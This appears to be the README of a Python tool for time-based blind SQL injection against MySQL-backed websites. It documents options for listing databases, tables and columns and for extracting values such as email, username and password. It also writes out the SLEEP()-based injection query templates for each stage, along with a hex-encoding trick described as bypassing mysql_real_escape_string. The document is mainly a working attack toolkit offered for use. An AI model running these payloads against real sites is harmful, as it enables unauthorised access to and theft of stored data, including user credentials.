## blind_sqli.py

[blind_sqli.py](blind_sqli.py) is a little tool written in python3 that can perform a Time-Based blind SQLi attack on a vulnerable website which backend is based on a MySQL server

```
./blind_sqli.py -u <url> [options]
	OPTIONS
	-h | --help											Print this message

	-u <url> | --url=<url>								Sets the url of the vulnerable page.
														Terminating with get parameters if needed. See --data option for structure rules

	-s <time:float> | --sleeptime=<time:float>			Sets wait time for SLEEP() instruction

	-d | --data											Strings that represents the POST request data in url encoded format
														in wich the parameters are in the form variablename=variabletype
														where variablename is the name uf the request paramenter 
														and variabletype is the tipe of the request parameter 
														the type could be either 'string' or 'number'
														E.g. email=string&id=number.
														I --data paremeter is set, the request will be performed in POST method

	--databases											Extract databases list

	-b <dbname> | --database=<dbname>					Sets the database name for the next instruction (--tables or --table)

	--tables											Extract the table list from the provided database

	-t <tablename> | --table=<tablename>				Sets the table name for the next instruction (--columns or --column-list)

	--columns											Extract column names list from the provided table

	-c <list> | --column-list=<list>					Sets a list of comma separated column names whose values ​​are to be extracted 
														E.g.: email,username,password

	-m | --mute											The program doesn't print the data extracted at the end of executon

	-v | --verbose										Verbose mode: the program prints also the payloads used for injection
```

1. retrieving databases:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_databases FROM information_schema.schemata)x WHERE x.n_databases = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT schema_name FROM information_schema.schemata LIMIT {},1)x WHERE MID(x.schema_name,{},1) = {} AND SLEEP(0.1)"
2. retrieving table names:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_tables FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + "))x WHERE x.n_tables = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT table_name FROM information_schema.tables WHERE table_schema = CONCAT(" + database_hex + ") LIMIT {},1)x WHERE MID(x.table_name,{},1) = {} AND SLEEP(0.1)"
3. retrieving column count and data type in tables:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_columns FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + "))x WHERE x.n_columns = {} AND SLEEP(0.1)"
	- extraction: "SELECT * FROM(SELECT CONCAT(column_name,"+hex(ord(':'))+",column_type) AS column_info FROM information_schema.columns WHERE table_schema = CONCAT(" + database_hex + ") AND table_name = CONCAT(" + table_hex + ") LIMIT {},1)x WHERE MID(x.column_info,{},1) = {} AND SLEEP(0.1)"
4. retrieving column data:
	- count: "SELECT * FROM (SELECT COUNT(*) AS n_rows FROM  " + db + '.' + table + ")x WHERE n_rows = {} AND SLEEP(0.1)"
	- extracton: "SELECT * FROM(SELECT CONCAT(" + columns_concat + ") AS data FROM " + db + '.' + table + " LIMIT {},1)x WHERE MID(x.data,{},1) = {} AND SLEEP(0.1)"

where:
- database_hex: hex string of comma separated characters, to use as argument for concat to bypass mysql_real_escape_string
- table_hex: same thing, but with table name
